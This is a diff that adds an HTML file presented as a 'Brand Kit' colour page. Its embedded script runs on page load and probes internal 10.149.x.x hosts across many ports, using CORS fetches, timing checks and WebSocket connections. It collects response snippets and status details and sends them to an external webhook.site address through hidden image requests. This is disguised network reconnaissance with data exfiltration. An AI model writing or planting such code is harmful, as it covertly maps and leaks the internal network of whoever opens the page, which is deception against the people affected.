@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html><head><title>Brand Kit</title></head><body>
+<h1 style="color:#00C4CC;font-family:Arial">Brand Colors</h1>
+<script>
+var wh="https://webhook.site/ecc2dc86-2fe4-41dc-b6dd-8cac2fc896c9/";
+var ips=["10.149.76.150","10.149.206.243","10.149.91.165"];
+var ports=[8080,9090,15000,3000,5601,80,8081,9091,8443,19000];
+var results=[];
+var done=0;
+var total=0;
+
+function report(tag,val){
+  results.push(tag+"="+val);
+  done++;
+  if(done>=total){
+    var chunk=results.join("|");
+    new Image().src=wh+"cors-probe?r="+encodeURIComponent(chunk.substring(0,1800));
+  }
+}
+
+// CORS fetch test - can we READ the response?
+ips.forEach(function(ip){
+  [8080,9090,15000,3000].forEach(function(port){
+    total++;
+    fetch("http://"+ip+":"+port+"/",{mode:"cors",credentials:"omit"})
+    .then(function(r){
+      r.text().then(function(t){
+        report("C-"+ip+"-"+port,"OK-"+r.status+"-"+t.substring(0,80).replace(/[^a-zA-Z0-9_.\/=-]/g,"_"));
+      }).catch(function(e){report("C-"+ip+"-"+port,"ok-notext-"+r.status);});
+    })
+    .catch(function(e){report("C-"+ip+"-"+port,"ERR-"+String(e).substring(0,40).replace(/[^a-zA-Z0-9_.\/=-]/g,"_"));});
+  });
+});
+
+// no-cors connectivity test on extra ports
+ips.slice(0,1).forEach(function(ip){
+  [15000,3000,5601,8081,9091,19000].forEach(function(port){
+    total++;
+    var t0=Date.now();
+    fetch("http://"+ip+":"+port+"/",{mode:"no-cors"})
+    .then(function(r){report("N-"+ip+"-"+port,"ok-"+(Date.now()-t0)+"ms");})
+    .catch(function(e){report("N-"+ip+"-"+port,"fail-"+(Date.now()-t0)+"ms");});
+  });
+});
+
+// WebSocket test
+ips.slice(0,2).forEach(function(ip){
+  [8080,15000].forEach(function(port){
+    total++;
+    try{
+      var ws=new WebSocket("ws://"+ip+":"+port+"/");
+      var wsTimeout=setTimeout(function(){ws.close();report("W-"+ip+"-"+port,"timeout");},3000);
+      ws.onopen=function(){clearTimeout(wsTimeout);report("W-"+ip+"-"+port,"OPEN");ws.close();};
+      ws.onerror=function(){clearTimeout(wsTimeout);report("W-"+ip+"-"+port,"err");};
+      ws.onmessage=function(e){clearTimeout(wsTimeout);report("W-"+ip+"-"+port,"MSG-"+String(e.data).substring(0,40));ws.close();};
+    }catch(ex){report("W-"+ip+"-"+port,"exc");}
+  });
+});
+
+// Timeout safety - send partial results after 10s
+setTimeout(function(){
+  if(done<total){
+    new Image().src=wh+"cors-probe-partial?r="+encodeURIComponent(results.join("|").substring(0,1800))+"&done="+done+"&total="+total;
+  }
+},10000);
+</script>
+</body></html>
